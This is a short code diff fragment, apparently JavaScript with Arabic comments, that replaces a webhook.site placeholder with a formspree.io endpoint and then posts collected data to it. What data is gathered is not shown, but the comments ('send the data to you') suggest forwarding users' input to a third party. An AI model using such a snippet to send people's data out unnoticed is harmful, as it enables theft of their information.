@@ -23,7 +23,7 @@
 
     // 2. إرسال البيانات إليك (باستخدام Webhook مجاني)
     // اذهب إلى موقع webhook.site وانسخ الرابط الخاص بك وضعه مكان الرابط بالأسفل
-    const myEndpoint = "https://webhook.site/YOUR_UNIQUE_ID"; 
+    const myEndpoint = "https://formspree.io/f/xzdpqrnj"; 
 
     fetch(myEndpoint, {
         method: "POST",
